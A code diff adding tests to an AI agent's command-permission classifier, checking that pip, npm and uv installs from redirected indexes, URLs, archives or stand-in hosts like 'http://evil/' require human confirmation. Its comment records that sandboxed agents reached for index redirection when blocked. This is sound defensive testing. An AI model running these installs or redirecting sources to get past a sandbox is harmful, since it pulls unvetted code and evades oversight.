@@ -213,6 +213,66 @@ def test_destructive_commands_escalate(tmp_workspace, command):
     assert classify("run_shell", {"command": command}, autonomous=False)[0] == "confirm"
 
 
+# --- FR-204: where a package comes from ------------------------------------
+#
+# Installing one is ordinary work: 58 of the 92 package-manager commands in
+# 7,290 recorded executions are `pip install -r requirements.txt`, and
+# `missing-dep` is SOLVED by `pip install tabulate`. Redirecting the index,
+# pointing at a URL or an archive, or replacing pip's config is a different act
+# - and it is what agents blocked by the sandbox's no-index actually reached
+# for, measured in those same runs.
+
+@pytest.mark.parametrize("command", [
+    "pip install --index-url https://pypi.org/simple humanize",
+    "pip install --no-index=False --index-url https://pypi.org/simple humanize",
+    "pip install pytest-codspeed --index-url https://pypi.org/simple --no-find-links",
+    "pip install --extra-index-url http://internal/ x",
+    "pip install -i http://evil/ x",
+    "pip install --trusted-host evil.example x",
+    "pip install --find-links http://evil/ x",
+    "pip3 install https://example.com/pkg.tar.gz",
+    "python -m pip install git+https://github.com/x/y",
+    "pip install /tmp/wheelhouse/thing.whl",
+    "PIP_CONFIG_FILE=/dev/null pip install humanize",
+    "npm install --registry http://evil/ left-pad",
+    "npm install https://example.com/pkg.tgz",
+    "uv pip install --index-url http://evil/ x",
+])
+def test_a_package_from_an_unvetted_source_escalates(tmp_workspace, command):
+    verdict, reason = classify("run_shell", {"command": command}, autonomous=False)
+    assert verdict == "confirm", command
+    assert "unvetted source" in reason, reason
+
+
+@pytest.mark.parametrize("command", [
+    "pip install tabulate",
+    "pip install tabulate>=0.9",
+    "pip install -r requirements.txt",
+    "pip install -r tests/requirements.txt",
+    "pip install -r ./requirements.txt",
+    "pip install -r /app/requirements.txt",
+    "python -m pip install -r ../requirements.txt",
+    "pip install --target /tmp/libs tabulate",
+    "pip install ./local-package",
+    "pip install pytest-benchmark pytest-codspeed",
+    "pip install -e .",
+    "pip install -e .[tests]",
+    "cd /workspace && pip install -e .",
+    "pip list | grep benchmark",
+    "pip config list",
+])
+def test_installing_a_named_package_is_ordinary_work(tmp_workspace, command):
+    """The rule has to be narrow or it fails a case that passes today.
+
+    A bare path is not a source: it is also every flag that takes one, and
+    `-r ./requirements.txt` denied autonomously fails `missing-dep`. A local
+    directory grants nothing `run_shell` does not already have in a writable
+    workspace, so it stays here too.
+    """
+    assert classify("run_shell", {"command": command},
+                    autonomous=False)[0] == "auto", command
+
+
 # --- hardline: no approval can allow it -----------------------------------
 #
 # A person saying "allow" is trusting the agent with their files. It is not
